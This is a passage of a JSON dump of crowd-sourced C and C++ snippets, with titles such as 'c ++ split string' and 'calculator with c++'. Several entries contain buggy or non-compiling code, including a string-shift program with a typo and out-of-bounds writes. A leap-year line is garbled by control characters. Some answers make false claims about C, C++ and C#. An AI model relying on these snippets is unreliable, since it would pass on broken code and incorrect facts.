out_file << \"Write this scentence in the file\" << endl;\nofstream myfile; myfile.open(\"file.txt\");  myfile << \"write this to file\"\n",
    "reg_date": "2021-10-12T11:38:52.000Z"
  },
  {
    "id": 1352,
    "keyword": null,
    "link": null,
    "title": " c++ x y in arrau 1d",
    "description": "for(int y = 0; y < rows; y++) {     for(int x = 0; x < cols; x++)     {         int point = grid[y * rows + x];     } } \n",
    "reg_date": "2021-10-12T11:38:52.000Z"
  },
  {
    "id": 1353,
    "keyword": null,
    "link": null,
    "title": " c/c++ ceasar cipher",
    "description": "#include<iostream>   using namespace std;   int main() { char message[100], ch; int i, key; cout << \"Enter a message to encrypt: \"; cin.getline(message, 100); cout << \"Enter key: \"; cin >> key; for(i = 0; message[i] != '\\0'; ++i){ ch = message[i]; if(ch >= 'a' && ch <= 'z'){ ch = ch + key; if(ch > 'z'){ ch = ch - 'z' + 'a' - 1; } message[i] = ch; } else if(ch >= 'A' && ch <= 'Z'){ ch = ch + key; if(ch > 'Z'){ ch = ch - 'Z' + 'A' - 1; } message[i] = ch; } } cout << \"Encrypted message: \" << message; return 0; } \n",
    "reg_date": "2021-10-12T11:38:53.000Z"
  },
  {
    "id": 1354,
    "keyword": null,
    "link": null,
    "title": " c ++ Program for addition of two matrix in diagonal using pointers",
    "description": "/* C++ program for Sum of diagonal elements of a matrix */ #include<iostream> using namespace std; int main() { \tint matrix[100][100], m, n ,i ,j, sum=0; \tcout<<\"Enter rows of matrix: \"; \tcin>>m; \tcout<<\"Enter columns of matrix: \"; \tcin>>n;   \tcout<<\"Enter matrix elements: \"<<endl; \tfor(i=0;i<m;i++) \t{ \t\tfor(j=0;j<n;j++) \t\t{ \t\t\tcin>>matrix[i][j]; \t\t} \t}   \t/* add diagonal elements into sum */ \tfor(i=0;i<m;i++) \t{ \t\tfor(j=0;j<n;j++) \t\t{ \t\t\tif(i==j) \t\t\tsum=sum+matrix[i][j]; \t\t} \t}   \tcout<<\"Sum of diagonal elements: \"<<sum;   \treturn 0;\t }\n",
    "reg_date": "2021-10-12T11:38:53.000Z"
  },
  {
    "id": 1355,
    "keyword": null,
    "link": null,
    "title": " c ++ split string",
    "description": "std::vector<std::string> split_string(const std::string& str,                                       const std::string& delimiter) {     std::vector<std::string> strings;      std::string::size_type pos = 0;     std::string::size_type prev = 0;     while ((pos = str.find(delimiter, prev)) != std::string::npos)     {         strings.push_back(str.substr(prev, pos - prev));         prev = pos + 1;     }      // To get the last substring (or only, if delimiter is not found)     strings.push_back(str.substr(prev));      return strings; } \n",
    "reg_date": "2021-10-12T11:38:53.000Z"
  },
  {
    "id": 1356,
    "keyword": null,
    "link": null,
    "title": " c ++ splitlines",
    "description": "std::vector<std::string> Loader::StringToLines(std::string string) {     std::vector<std::string> result;     std::string temp;     int markbegin = 0;     int markend = 0;      for (int i = 0; i < string.length(); ++i) {              if (string[i] == '\\n') {             markend = i;             result.push_back(string.substr(markbegin, markend - markbegin));             markbegin = (i + 1);         }     }     return result; } \nstd::vector<std::string> split_string_by_newline(const std::string& str) {     auto result = std::vector<std::string>{};     auto ss = std::stringstream{str};      for (std::string line; std::getline(ss, line, '\\n');)         result.push_back(line);      return result; } \n",
    "reg_date": "2021-10-12T11:38:53.000Z"
  },
  {
    "id": 1357,
    "keyword": null,
    "link": null,
    "title": " c   pointers vs references",
    "description": "Pointers: A pointer is a variable that holds memory address of another variable. A pointer needs to be dereferenced with * operator to access the memory location it points to.  References : A reference variable is an alias, that is, another name for an already existing variable. A reference, like a pointer, is also implemented by storing the address of an object. A reference can be thought of as a constant pointer (not to be confused with a pointer to a constant value!) with automatic indirection, i.e the compiler will apply the * operator for you. ******************************************* *******************************************    A pointer can be re-assigned:  int x = 5; int y = 6; int *p; p = &x; p = &y; *p = 10; assert(x == 5); assert(y == 10); -----------------------------------------  A reference cannot, and must be assigned at initialization:  int x = 5; int y = 6; int &r = x; ------------------------------------------- A pointer has its own memory address and size on the stack (4 bytes on x86), whereas a reference shares the same memory address (with the original variable) but also takes up some space on the stack. Since a reference has the same address as the original variable itself, it is safe to think of a reference as another name for the same variable. Note: What a pointer points to can be on the stack or heap. Ditto a reference. My claim in this statement is not that a pointer must point to the stack. A pointer is just a variable that holds a memory address. This variable is on the stack. Since a reference has its own space on the stack, and since the address is the same as the variable it references. More on stack vs heap. This implies that there is a real address of a reference that the compiler will not tell you.  int x = 0; int &r = x; int *p = &x; int *p2 = &r; assert(p == p2); ------------------------------------------- You can have pointers to pointers to pointers offering extra levels of indirection. Whereas references only offer one level of indirection.  int x = 0; int y = 0; int *p = &x; int *q = &y; int **pp = &p; pp = &q;//*pp = q **pp = 4; assert(y == 4); assert(x == 0); ------------------------------------------- A pointer can be assigned nullptr directly, whereas reference cannot. If you try hard enough, and you know how, you can make the address of a reference nullptr. Likewise, if you try hard enough, you can have a reference to a pointer, and then that reference can contain nullptr.  int *p = nullptr; int &r = nullptr; <--- compiling error int &r = *p;  <--- likely no compiling error, especially if the nullptr is hidden behind a function call, yet it refers to a non-existent int at address 0 Pointers can iterate over an array; you can use ++ to go to the next item that a pointer is pointing to, and + 4 to go to the 5th element. This is no matter what size the object is that the pointer points to.  ------------------------------------------- A pointer needs to be dereferenced with * to access the memory location it points to, whereas a reference can be used directly. A pointer to a class/struct uses -> to access it's members whereas a reference uses a .. ------------------------------------------- References cannot be stuffed into an array, whereas pointers can be! -------------------------------------------  Const references can be bound to temporaries. Pointers cannot (not without some indirection):  const int &x = int(12); //legal C++ int *y = &int(12); //illegal to dereference a temporary. This makes const& safer for use in argument lists and so forth.\n",
    "reg_date": "2021-10-12T11:38:53.000Z"
  },
  {
    "id": 1358,
    "keyword": null,
    "link": null,
    "title": " c create 1 bit value",
    "description": "// Remember, the data type of the member variable needs to be unsigned,  // as you only need to store 0 and 1.  typedef struct foo {     unsigned x:1; } foo; \n",
    "reg_date": "2021-10-12T11:38:53.000Z"
  },
  {
    "id": 1359,
    "keyword": null,
    "link": null,
    "title": " c for loop decrement",
    "description": "for (int i = 10; i > 0; --i) { \n",
    "reg_date": "2021-10-12T11:38:53.000Z"
  },
  {
    "id": 1360,
    "keyword": null,
    "link": null,
    "title": " c language all keywords in string",
    "description": "\"auto|break|case|char|const|continue|default|do|double|else|enum|extern|float|for|goto|if|int|long|register|return|short|signed|sizeof|static|struct|switch|typedef|union|unsigned|void|volatile|while\n",
    "reg_date": "2021-10-12T11:38:53.000Z"
  },
  {
    "id": 1361,
    "keyword": null,
    "link": null,
    "title": " c language array",
    "description": "int size=5; int array[size]; // array of size=5;  for(i=0;i<size;i++){    scanf(\"%d\",&array[i]);                 }\nint array[5]={1,2,3,4,5};\n",
    "reg_date": "2021-10-12T11:38:53.000Z"
  },
  {
    "id": 1362,
    "keyword": null,
    "link": null,
    "title": " c number of elements in array",
    "description": "int my_strlen(char *str) {   int i = -1;      while (str && str[++i]);   return (i); }\n",
    "reg_date": "2021-10-12T11:38:54.000Z"
  },
  {
    "id": 1363,
    "keyword": null,
    "link": null,
    "title": " c program to right shift a string by 2 numbers",
    "description": "/*c,cpp program to right shift a string by n positions (may be 1right, 2right, etc.)*/ #include <string> using namespace std; void main() { \tstring str=\"apple\";     int shift;     cout<<\"Enter the number of shifts for the string to get shifted: \";     cin>>shfit;     int n=str.length();     for(int i=n+2;i>=shift;i--){         str[i]=str[i-shift];     }     //now the string is shifted by 'shift' positions \"right\". }               \n",
    "reg_date": "2021-10-12T11:38:54.000Z"
  },
  {
    "id": 1364,
    "keyword": null,
    "link": null,
    "title": " c str in c++",
    "description": "What does c_str () do in C++?    The basic_string::c_str() is a builtin function in C++ which returns a pointer to an array that contains a null-terminated sequence of characters representing  the current value of the basic_string object.\n",
    "reg_date": "2021-10-12T11:38:54.000Z"
  },
  {
    "id": 1365,
    "keyword": null,
    "link": null,
    "title": " c strlen",
    "description": "#include <stdio.h> #include <string.h> int main() {     char a[20]=\"Program\";     char b[20]={'P','r','o','g','r','a','m','\\0'};      // using the %zu format specifier to print size_t     printf(\"Length of string a = %zu \\n\",strlen(a));     printf(\"Length of string b = %zu \\n\",strlen(b));      return 0; }\n#include <string.h> // Corrolary to below\nint my_strlen(char *str) {   int i = -1;      while (str && str[++i]);   return (i); }\n",
    "reg_date": "2021-10-12T11:38:54.000Z"
  },
  {
    "id": 1366,
    "keyword": null,
    "link": null,
    "title": " c to c++ converter online",
    "description": " #ifndef CMAC_H #define CMAC_H void AES_CMAC(unsigned char *key, unsigned char *input, int length, \tunsigned char *mac);  #endif\n123456789101112#include <stdio.h>#if !defined (MESSAGE)#define MESSAGE \"You wish!\"#endifint main(void){cout << \"Hello World\" << endl;return 0;}X\n#include <stdio.h> #include <stdlib.h>  int main (void){ \tint vetor [2]; \tint *v; // ponteiro \tv = vetor; \tv[0] = 123; \tv[1] = 456; \tprintf (\"vetor[0] = %d\\n\", vetor[0]); \tprintf (\"vetor[1] = %d\\n\\n\", vetor[1]); \tsystem (\"pause\"); }\n// C++ program to generate all possible // valid IP addresses from given string #include <bits/stdc++.h> using namespace std;  // Function checks whether IP digits // are valid or not. int is_valid(string ip) { \t// Splitting by \".\" \tvector<string> ips; \tstring ex = \"\"; \tfor (int i = 0; i < ip.size(); i++) { \t\tif (ip[i] == '.') { \t\t\tips.push_back(ex); \t\t\tex = \"\"; \t\t} \t\telse { \t\t\tex = ex + ip[i]; \t\t} \t} \tips.push_back(ex);  \t// Checking for the corner cases \t// cout << ip << endl; \tfor (int i = 0; i < ips.size(); i++) { \t\t// cout << ips[i] <<endl; \t\tif (ips[i].length() > 3 \t\t\t|| stoi(ips[i]) < 0 \t\t\t|| stoi(ips[i]) > 255) \t\t\treturn 0;  \t\tif (ips[i].length() > 1 \t\t\t&& stoi(ips[i]) == 0) \t\t\treturn 0;  \t\tif (ips[i].length() > 1 \t\t\t&& stoi(ips[i]) != 0 \t\t\t&& ips[i][0] == '0') \t\t\treturn 0; \t} \treturn 1; }  // Function converts string to IP address void convert(string ip) { \tint l = ip.length();  \t// Check for string size \tif (l > 12 || l < 4) { \t\tcout << \"Not Valid IP Address\"; \t}  \tstring check = ip; \tvector<string> ans;  \t// Generating different combinations. \tfor (int i = 1; i < l - 2; i++) { \t\tfor (int j = i + 1; j < l - 1; j++) { \t\t\tfor (int k = j + 1; k < l; k++) { \t\t\t\tcheck = check.substr(0, k) + \".\" \t\t\t\t\t\t+ check.substr(k, l - k + 2); \t\t\t\tcheck \t\t\t\t\t= check.substr(0, j) + \".\" \t\t\t\t\t+ check.substr(j, l - j + 3); \t\t\t\tcheck \t\t\t\t\t= check.substr(0, i) + \".\" \t\t\t\t\t+ check.substr(i, l - i + 4);  \t\t\t\t// cout<< check <<endl; \t\t\t\t// Check for the validity of combination \t\t\t\tif (is_valid(check)) { \t\t\t\t\tans.push_back(check); \t\t\t\t\tstd::cout << check << '\\n'; \t\t\t\t} \t\t\t\tcheck = ip; \t\t\t} \t\t} \t} }  // Driver code int main() { \tstring A = \"25525511135\"; \tstring B = \"25505011535\";  \tconvert(A); \tconvert(B);  \treturn 0; }  // This code is contributed by Harshit \n    string word;\n123456789101112131415161718192021222324252627#include <iostream>#include <bits/stdc++.h>using namespace std;class ABS{    public:        void abs(int arr[], int n){    sort(arr, arr+n);    int c=0,i;    for (i=n-1;i-2>=0;i--){        if (arr[i-2]+arr[i-1]>arr[i]){            c=1;            break;        }    }    (c) ? cout<<arr[i-2]<<\" \"<<arr[i-1]<<\" \"<<arr[i]<<endl : cout<<-1<<endl;}};int main(){    ABS abx;    int arr[] = { 5,4,3,1,2};    int n = sizeof(arr) / sizeof(arr[0]);    abx.abs(arr, n);    return 0;}X\n",
    "reg_date": "2021-10-12T11:38:54.000Z"
  },
  {
    "id": 1367,
    "keyword": null,
    "link": null,
    "title": " c vs c++",
    "description": "C++ is faster than C, Sad but thats the truth, C++ is more complex compared to C whereas C is simple both gives the developer more control over the hardware. C++ supports object oriented programming, features like: Encapsulation, Polymorphism, Abstraction, Inheritance, I personally prefer C++ But if you want learn C++, first learn C, get comfortable with C then move to C++ so you can easily transition from C to C++ anytime you want, because now you already know C, And C++ is basically extension of C so yeah.\nC Because it is faster and lighter, but if you need objects the c++\nC++ compiles into machine code, while C# compiles to CLR, which is interpreted by ASP.NET. C++ requires you to handle memory manually, but C# runs in a virtual machine which can automatically handle memory management. C# does not use pointers, while C++ can use pointers anywhere. C++ can be used on any platform, though it was originally designed for Unix-based systems. C# is standardized but is rarely used outside of Windows environments. C++ can create stand-alone and console applications. C# can create a console, Windows, ASP.NET, and mobile applications, but cannot create stand-alone apps.\nC++ allows for better object oriented programming\nnothing better than C - linus torvalds (the founder of linux and git)\n1.C++ compiles into machine code, while C# compiles to CLR, which is interpreted by ASP.NET. 2.C++ requires you to handle memory manually, but C# runs in a virtual machine which can automatically handle memory management. 3.C# does not use pointers, while C++ can use pointers anywhere. 4.C++ can be used on any platform, though it was originally designed for Unix-based systems. C# is standardized but is rarely used outside of Windows environments. 5.C++ can create stand-alone and console applications. C# can create a console, Windows, ASP.NET, and mobile applications, but cannot create stand-alone apps.\n",
    "reg_date": "2021-10-12T11:38:54.000Z"
  },
  {
    "id": 1368,
    "keyword": null,
    "link": null,
    "title": " c vs c++ vs c#",
    "description": "//C++ because I said so.\n//you should choose c# purely because unity is BOOOOOOOOMMMMMBBBBB\n// Both languages are great for beginners. However, they have their // differences. Java is an object-oriented programming language, // whereas Python is often considered to be a scripting language.\n// c# is similar to java so idk\n",
    "reg_date": "2021-10-12T11:38:54.000Z"
  },
  {
    "id": 1369,
    "keyword": null,
    "link": null,
    "title": " calc",
    "description": "upvote if you feel terrible\n/// linear-interpolation /// Calculate the definition of a line between two points /// @param $map - A SASS map of viewport widths and size value pairs /// @returns A linear equation as a calc() function /// @example ///   font-size: linear-interpolation((320px: 18px, 768px: 26px)); /// @author Jake Wilson <jake.e.wilson@gmail.com> @function linear-interpolation($map) {   $keys: map-keys($map);   @if (length($keys) != 2) {     @error \"linear-interpolation() $map must be exactly 2 values\";   }   // The slope   $m: (map-get($map, nth($keys, 2)) - map-get($map, nth($keys, 1)))/(nth($keys, 2) - nth($keys,1));      // The y-intercept   $b: map-get($map, nth($keys, 1)) - $m * nth($keys, 1);      // Determine if the sign should be positive or negative   $sign: \"+\";   @if ($b < 0) {     $sign: \"-\";     $b: abs($b);   }      @return calc(#{$m*100}vw #{$sign} #{$b}); } \nx = \"Ya why are you looking like this??!\" print(\"Go Find Yourself you creppy person!\" + x)  const x = \"really\" console.log(\"Go Find Yourself you creppy person!\" + x)\ninput1 = int(input()) eval(input1)\n#include <iostream> #define LOG(x) std::cout << x << std::endl  struct BadGamer{   void BAD(){   \tLOG(\"Uses Calculator and is Bad at games\");   } }; struct GoodGamer{   void GOOD(){   \tLOG(\"Doesn't use Calculator and is Good at games\");   } };  int main(){   int rep;   LOG(\"Do you Use calculator\");   std::cin >> rep >> std::endl;   if(rep == 1){   \tBadGamer.BAD();   }   if(rep == 0){   \tGoodGamer.GOOD();   }else{     std::cout << \"BRUUH\" std::endl;   } }\n",
    "reg_date": "2021-10-12T11:38:54.000Z"
  },
  {
    "id": 1370,
    "keyword": null,
    "link": null,
    "title": " calculate factorial",
    "description": "int factorial(int n) { \tint res = 1, i;      for (i = 2; i <= n; i++)          res *= i;      return res;  }\n(apply * (range n 0 -1)) ; plug in anything for n for n factorial\n// METHOD ONE const factorialNumber = num => {     let factorials = []     for(let i = 1; i <= num; i++) factorials.push(i)     return factorials.reduce((acc , curr) => acc * curr, 1) }  // METHOD TWO const factorialNumber = num => {     let factorial = 1, i = 1     while(i <= num){ factorial *= i; i++ }     return factorial } // METHOD THREE function factorialNumber(num) {     if(num < 1) return 1     else return factorialNumber(num - 1) * num }\n",
    "reg_date": "2021-10-12T11:38:55.000Z"
  },
  {
    "id": 1371,
    "keyword": null,
    "link": null,
    "title": " calculate if year is leap year",
    "description": "if (i%4==0 && i\u00100!=0 || i@0==0) { months[2] = 29; } else { month[2] = 28; }\n#include <iostream> using namespace std;  int main() {     int year;     cout << \"Enter a year: \";     cin >> year;     if (year % 4 == 0) {         if (year % 100 == 0) {             (year % 400 == 0) ?             cout << year << \" is a leap year.\" :             cout << year << \" is not a leap year.\";         }         else             cout << year << \" is a leap year.\";     }     else         cout << year << \" is not a leap year.\";     return 0; }\n",
    "reg_date": "2021-10-12T11:38:55.000Z"
  },
  {
    "id": 1372,
    "keyword": null,
    "link": null,
    "title": " calculate time difference cpp",
    "description": "#include <chrono>  auto t_start = std::chrono::high_resolution_clock::now(); // the work... auto t_end = std::chrono::high_resolution_clock::now();  double elapsed_time_ms = std::chrono::duration<double, std::milli>(t_end-t_start).count(); \n",
    "reg_date": "2021-10-12T11:38:55.000Z"
  },
  {
    "id": 1373,
    "keyword": null,
    "link": null,
    "title": " calculator with c++",
    "description": "// This is for beginners  #include <iostream>  using namespace std;  void greetings() {     cout << \"welcome to the calculator made in c++ :D\\n\"; }  void instructions() {     cout << \"Here is the operators you can use + - / *\\n\"; }  int main() {     greetings();     instructions();     int num1, num2;     char op;     int result;     char again = 'Y';      while (again == 'y' || again == 'Y') {            cout << \"\\nEnter your first digit: \";         cin >> num1;          cout << \"\\nEnter your operator digit: \";         cin >> op;          cout << \"\\nEnter your second digit: \";         cin >> num2;          if (op == '+') {             result = num1 + num2;         }         else if (op == '-') {             result = num1 - num2;         }         else if (op == '*') {             result = num1 * num2;         }         else if (op == '/') {             result = num1 / num2;         }         else {             cout << \"Invalid operator\";         }          cout << \"= \" << result;         cout << \"\\nDo you want to restart the calculator? (Y or N)\";         cin >> again;     }      system(\"pause>0\");      return 0; }\n#include <iostream>  using namespace std;  int main() { cout << \"Welcome to the Calculator, write :cancel: to cancel the calculator\\n\";  string cancel;   while(cancel != \"cancel\")  {      int number1 = 0;      int number2 = 0;      string op;       cout << \"please enter your first number!\\n\";       cin >> number1;       cout << \"please enter your second number!\\n\";       cin >> number2;        cout << \"please enter a operator!\\n\";      cout << \"( *, / , + , - )\";       cin >> op;          if(op == \"*\")     {         number1 = number1 * number2;         cout << number1;          number1 = 0;         number2 = 0;     }      if(op == \"/\")     {         number1 = number1 / number2;         cout << number1;         number1 = 0;         number2 = 0;     }      if(op == \"+\")     {         number1 = number1 + number2;          cout << number1;         number1 = 0;         number2 = 0;     }      if(op == \"-\")     {         number1 = number1 - number2;         cout << number1;          number1 = 0;          number2 = 0;     }          cout << \"Write cancel to cancel\\n\";     cout << \"write continue to resume with the calculator!\\n\";          cin >> cancel;   }       } //powered by my coding server: https://discord.gg/GUgnYHJV\n#include <iostream> using namespace std;  int main() { \tint choice;  \tcout << 1 << endl; \tcout << 2 << endl; \tcout << 3 << endl; \tcout << 4 << endl;  \tcout << \"Choice A Number: \"; \tcin >> choice;  \tif (choice >= 1 && choice <= 4) \t{ \t\tint a, b;  \t\tcout << \"Enter Num One: \"; \t\tcin >> a; \t\tcout << \"Enter Num Two: \"; \t\tcin >> b;  \t\tif (choice == 1) \t\t\tcout << a << \"+\" << b << \"=\" << a + b << endl; \t\tif (choice == 2) \t\t\tcout << a << \"-\" << b << \"=\" << a - b << endl; \t\tif (choice == 3) \t\t\tcout << a << \"*\" << b << \"=\" << a * b << endl; \t} \telse \t{ \t\tcout << \"Wrong Choice\" << endl; \t} }\n#include <iostream>  using namespace std;  int main() { int num1; int num2; char op;      cout << \"Enter a number:\" << endl;   cin >> num1; //takes input      cout << \"Enter another number:\" << endl; //prints some prompt   cin >> num2;      cout << \"Enter a operator:\" << endl; //prints some prompt   cin >> op;      if(op == '+')   {   cout << \"Result = \" << num1 + num2 << endl;   }else if(op == '-'){   cout << \"Result = \" << num1 - num2 << endl;   }else if(op == '*'){   cout << \"Result = \" << num1 * num2 << endl;   }else if(op == '/'){   cout << \"Result = \" << num1 / num2 << endl;   }       }\n",
    "reg_date": "2021-10-12T11:38:55.000Z"
  },
  {
    "id": 1374,
    "keyword": null,
    "link": null,
    "title": " call by reference c++ example",
    "description": "//call by reference example c++ #include <iostream>  using namespace std;  void swap(int& x, int& y) { \tcout << x << \" \" << y << endl; \tint temp = x; \tx = y; \ty = temp; \tcout << x << \" \" << y << endl;  }  int main() {      \tint a = 7; \tint b = 9;  \tswap(a, b);  } \nvoid fun3(int a) {     a = 10; }  int main() {     int b = 1;     fun3(b);     // b  is still 1 now!     return 0;    }\n",
    "reg_date": "2021-10-12T11:38:55.000Z"
  },
  {
    "id": 1375,
    "keyword": null,
    "link": null,
    "title": " call by value in c++",
    "description": "// function definition to swap the values. void swap(int x, int y) {    int temp;     temp = x; /* save the value of x */    x = y;    /* put y into x */    y = temp; /* put x into y */       return; }\n",
    "reg_date": "2021-10-12T11:38:55.000Z"
  },
  {
    "id": 1376,
    "keyword": null,
    "link": null,
    "title": " call constructor from another c++",
    "description": "//You can use delegating constructor (since C++11) like this: Foo(int iX)  {     // ... };   Foo() : Foo(10) {    }\n",
    "reg_date": "2021-10-12T11:38:55.000Z"
  },
  {
    "id": 1377,
    "keyword": null,
    "link": null,
    "title": " call function from separate bash script",
    "description": "#second.sh func1 {    fun=\"$1\"    book=\"$2\"    printf \"func=%s,book=%s\\n\" \"$fun\" \"$book\" }  func2 {    fun2=\"$1\"    book2=\"$2\"    printf \"func2=%s,book2=%s\\n\" \"$fun2\" \"$book2\" }  #first.sh source ./second.sh func1 love horror func2 ball mystery \n",
    "reg_date": "2021-10-12T11:38:55.000Z"
  },
  {
    "id": 1378,
    "keyword": null,
    "link": null,
    "title": " call of overloaded ‘swap(int&, int&)’ is ambiguous",
    "description": "Your swap conflicts with std::swap. Remove using namespace std;  above and correct the rest code from std namespace.\n",
    "reg_date": "2021-10-12T11:38:55.000Z"
  },
  {
    "id": 1379,
    "keyword": null,
    "link": null,
    "title": " call the above greet() function",
    "description": "int main() {           // calling a function        greet();   }\n",
    "reg_date": "2021-10-12T11:38:56.000Z"
  },
  {
    "id": 1380,
    "keyword": null,
    "link": null,
    "title": " call to constructor of 'extClockType' is ambiguous extClockType time2;",
    "description": "call to constructor of 'extClockType' is ambiguous extClockType time2; \n",
    "reg_date": "2021-10-12T11:38:56.000Z"
  },
  {
    "id": 1381,
    "keyword": null,
    "link": null,
    "title": " calling a method on an object c++",
    "description": "MyClass m;  m.printInformation();\n",
    "reg_date": "2021-10-12T11:38:56.000Z"
  },
  {
    "id": 1382,
    "keyword": null,
    "link": null,
    "title": " calling base class function from derived class object",
    "description": "#include <iostream> #include <string>  using namespace std;  class Person{ public:     void introduce(){     cout <<\"hey from person\"<<endl;     } };  class Student : public Person{ public:     void introduce(){     cout <<\"hey from student\"<<endl;     } };  void whosThis(Person &p){ p.introduce(); }  int main() {     Student anil;     anil.introduce();     whosThis(anil);     return 0; }   \n",
    "reg_date": "2021-10-12T11:38:56.000Z"
  },
  {
    "id": 1383,
    "keyword": null,
    "link": null,
    "title": " calling by reference and pointers c++",
    "description": "#include <iostream> using namespace std;  // Function prototype void swap(int&, int&);  int main() {     int a = 1, b = 2;     cout << \"Before swapping\" << endl;     cout << \"a = \" << a << endl;     cout << \"b = \" << b << endl;      swap(a, b);      cout << \"\\nAfter swapping\" << endl;     cout << \"a = \" << a << endl;     cout << \"b = \" << b << endl;      return 0; }  void swap(int& n1, int& n2) {     int temp;     temp = n1;     n1 = n2;     n2 = temp; }\n#include <iostream> using namespace std;  // Function prototype void swap(int*, int*);  int main() {     int a = 1, b = 2;     cout << \"Before swapping\" << endl;     cout << \"a = \" << a << endl;     cout << \"b = \" << b << endl;      swap(&a, &b);      cout << \"\\nAfter swapping\" << endl;     cout << \"a = \" << a << endl;     cout << \"b = \" << b << endl;     return 0; }  void swap(int* n1, int* n2) {     int temp;     temp = *n1;     *n1 = *n2;     *n2 = temp; }\n",
    "reg_date": "2021-10-12T11:38:56.000Z"
  },
  {
    "id": 1384,
    "keyword": null,
    "link": null,
    "title": " calling by reference c++",
    "description": "int main() {     int b = 1;     fun(&b);     // now b = 10;     return 0; }\nvoid fun2(int& a)  {     a = 5; }  int main() {     int b = 10;     fun2(b);       // now b = 5;     return 0; }\nvoid fun(int *a) {    *a = 10; }\n//call by reference example c++ #include <iostream>  using namespace std;  void swap(int& x, int& y) { \tcout << x << \" \" << y << endl; \tint temp = x; \tx = y; \ty = temp; \tcout << x << \" \" << y << endl;  }  int main() {      \tint a = 7; \tint b = 9;  \tswap(a, b);  } \nvoid fun3(int a) {     a = 10; }  int main() {     int b = 1;     fun3(b);     // b  is still 1 now!     return 0;    }\n",
    "reg_date": "2021-10-12T11:38:56.000Z"
  },
  {
    "id": 1385,
    "keyword": null,
    "link": null,
    "title": " camelCase Problem",
    "description": "print(sum(map(str.isupper, input())) + 1) \n",
    "reg_date": "2021-10-12T11:38:56.000Z"
  },
  {
    "id": 1386,
    "keyword": null,
    "link": null,
    "title": " can derived class access private members",
    "description": "//In all cases, private members of the base class remain private. Private members of the base class cannot be used by the derived class unless friend declarations within the base class explicitly grant access to them.\n",
    "reg_date": "2021-10-12T11:38:56.000Z"
  },
  {
    "id": 1387,
    "keyword": null,
    "link": null,
    "title": " can we compare a long long int with int in c++ using max or min functions",
    "description": "// No we can't compare , overflow occurs\n",
    "reg_date": "2021-10-12T11:38:57.000Z"
  },
  {
    "id": 1388,
    "keyword": null,
    "link": null,
    "title": " can you add a bool and an int",
    "description": "Yes, as a bool is 1 (true) or 0 (false)\n",
    "reg_date": "2021-10-12T11:38:57.000Z"
  },
  {
    "id": 1389,
    "keyword": null,
    "link": null,
    "title": " can you chnage the address of a pointer",
    "description": "No you can not change the address of a pointer but you can change its value.\n",
    "reg_date": "2021-10-12T11:38:57.000Z"
  },
  {
    "id": 1390,
    "keyword": null,
    "link": null,
    "title": " can you use rand to read in from an external file inc++",
    "description": "string line; int random = 0; int numOfLines = 0; ifstream File(\"file.txt\");      srand(time(0));     random = rand() % 50;  while(getline(File, line)) {     ++numOfLines;      if(numOfLines == random)     {         cout << line;     }  }\n",
    "reg_date": "2021-10-12T11:38:57.000Z"
  },
  {
    "id": 1391,
    "keyword": null,
    "link": null,
    "title": " can you verify adsense no ssl certificate",
    "description": "No. An SSL doesn't required to get verified by Google Adsense. ... Since 2014 Google has announced that, if all factors are equal, it would give a better rank to the website with HTTPS than HTTP website. So an SSL is one of the important SEO factor.\n",
    "reg_date": "2021-10-12T11:38:57.000Z"
  },
  {
    "id": 1392,
    "keyword": null,
    "link": null,
    "title": " cannot find \"-lsqlite3\" C++",
    "description": "to use sqlite3 in your C++ / C source code you should download the amalgamation C source file at \"https://www.sqlite.org/download.html\"    then extract the source files in your source folder.    Then in your code you include sqlite3 with : #include \"sqlite3.h\"  and finaly you compile your program with : gcc yourSourceFile.cpp sqlite3.c -o yourExeFile.exe\n",
    "reg_date": "2021-10-12T11:38:57.000Z"
  },
  {
    "id": 1393,
    "keyword": null,
    "link": null,
    "title": " cannot find -lsqlite3 C++ compiler error",
    "description": "to use sqlite3 in your C++ / C source code you should download the amalgamation C source file at \"https://www.sqlite.org/download.html\"    then extract the source files in your source folder.    Then in your code you include sqlite3 with : #include \"sqlite3.h\"  and finaly you compile your program with : gcc yourSourceFile.cpp sqlite3.c -o yourExeFile.exe\n",
    "reg_date": "2021-10-12T11:38:57.000Z"
  },
  {
    "id": 1394,
    "keyword": null,
    "link": null,
    "title": " cannot get",
    "description": "Cannot GET / help\nCannot GET /\nCannot GET /dogs\na. Angular Live Development Server is not running, or b. Check Angular Live Development Server for compilation errors.\n",
    "reg_date": "2021-10-12T11:38:57.000Z"
  },
  {
    "id": 1395,
    "keyword": null,
    "link": null,
    "title": " cannot jump from switch statement to this case label c++",
    "description": "put everything in the case x: under {} brackets metti tutto quello nel case x: sotto le parentesi {}\nswitch (choice) {     case 1: get_two_numbers(x, y);             //* vv here vv *             int sum = add(x, y);             //* ^^ here ^^ */             cout << x << \" + \" << y << \" = \" <<  sum << endl;             break;     case 2: get_two_numbers(x, y);             //* vv here vv */             int diff = subtract(x, y);             //* ^^ here ^^ */             cout << x << \" - \" << y << \" = \" <<  diff << endl;             break;     default:; }\nswitch(foo) {   case 1:     int i = 42; // i exists all the way to the end of the switch     dostuff(i);     break;   case 2:     dostuff(i*2); // i is *also* in scope here, but is not initialized! }\n",
    "reg_date": "2021-10-12T11:38:57.000Z"
  },
  {
    "id": 1396,
    "keyword": null,
    "link": null,
    "title": " cannot open include file:",
    "description": "#include \"..\\include\\xyz.h\" //Either move the xyz.h file somewhere else so the preprocessor can find it, or else change the #include statement so the preprocessor finds it where it already is //<some folder>\\xyz.h //<some folder>\\code\\xyz.cxx  \n",
    "reg_date": "2021-10-12T11:38:57.000Z"
  },
  {
    "id": 1397,
    "keyword": null,
    "link": null,
    "title": " capitalize first letter c++",
    "description": "string str = \"something\"; str[0] = toupper(str[0]);\n",
    "reg_date": "2021-10-12T11:38:58.000Z"
  },
  {
    "id": 1398,
    "keyword": null,
    "link": null,
    "title": " case label in c++",
    "description": "switch(foo) {   case 1:     int i = 42; // i exists all the way to the end of the switch     dostuff(i);     break;   case 2:     dostuff(i*2); // i is *also* in scope here, but is not initialized! }\n",
    "reg_date": "2021-10-12T11:38:58.000Z"
  },
  {
    "id": 1399,
    "keyword": null,
    "link": null,
    "title": " cast c++",
    "description": "#include <iostream> using namespace std; int main(){ \tint x = 4; \tint y = 2; \tcout<<\"La divisione dei valori e': \"<<(float)y/x<<endl; }\n",
    "reg_date": "2021-10-12T11:38:58.000Z"
  },
  {
    "id": 1400,
    "keyword": null,
    "link": null,
    "title": " casting C++",
